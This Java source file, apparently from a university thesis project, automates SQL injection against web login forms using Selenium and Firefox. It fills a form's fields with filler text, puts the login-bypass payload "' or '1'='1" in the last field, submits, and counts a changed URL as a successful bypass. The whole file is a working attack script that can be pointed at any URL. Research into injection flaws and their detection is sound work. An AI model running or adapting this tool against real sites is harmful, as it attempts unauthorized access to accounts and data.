package de.saarland.thesis.sqlinjection;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriverService;
import org.openqa.selenium.firefox.FirefoxDriver;

/**
 *
 * @author sireto
 */
public class FirefoxSqlInjector implements SqlInjector {

    private WebDriver driver;
    private String url;

    private static ChromeDriverService service;

    public FirefoxSqlInjector() {
        System.setProperty("webdriver.gecko.driver", "driver/geckodriver");
        this.driver = new FirefoxDriver();
        this.url = "";

        // wait 10 seconds
        driver.manage().timeouts().implicitlyWait(20, TimeUnit.SECONDS);
    }

    public void run() {
        // get the actual url
        if (this.driver != null) {
            // open page
            this.driver.get(url);

            String genericTextValue = "test string";
            String attackString = "' or '1'='1";

            try {
                WebElement formEl = driver.findElement(By.tagName("form"));
                if (formEl != null) {
                    List<WebElement> inputElements = formEl.findElements(By.cssSelector("input"));
                    System.out.println("Total input elements:" + inputElements.size());
                    
                    // we need at least 2 input html field
                    // at least 1 input text type and 1 submit type
                    if (inputElements.size() < 2) {
                        return;
                    }

                    // Filter input with type text or password
                    List<WebElement> inputTextEls = new ArrayList<WebElement>();
                    WebElement submitBtn = null;

                    for (WebElement el : inputElements) {
                        String type = el.getAttribute("type");
                        if (type.equals("text") || type.equals("password")) {
                            inputTextEls.add(el);
                        } else if (type.equals("submit")) {
                            submitBtn = el;
                        }
                    }

                    for (int i = 0; i < inputTextEls.size() - 1; i++) {
                        WebElement inputEl = inputTextEls.get(i);
                        inputEl.sendKeys(genericTextValue);
                    }

                    // on last input element, put attack string
                    if (inputTextEls.size() > 0) {
                        WebElement lastInputEl = inputTextEls.get(inputTextEls.size() - 1);
                        lastInputEl.sendKeys(attackString);
                    }

                    // Get submit button
                    if (submitBtn != null) {
                        submitBtn.click();
                    }

                    // wait for page loading
                    try {
                        Thread.sleep(2000);
                    } catch (InterruptedException ex) {
                        Logger.getLogger(FirefoxSqlInjector.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
            } catch (org.openqa.selenium.NoSuchElementException nfe) {
                nfe.printStackTrace();
            }

        }

    }

    @Override
    public void setURL(String url) {
        this.url = url;
    }

    @Override
    public String getURL() {
        return this.url;
    }

    @Override
    public boolean isSuccessful() {
        System.out.println("current url:" + driver.getCurrentUrl());
        if (!driver.getCurrentUrl().equals(this.url)) {
            return true;
        }
        return false;
    }

}
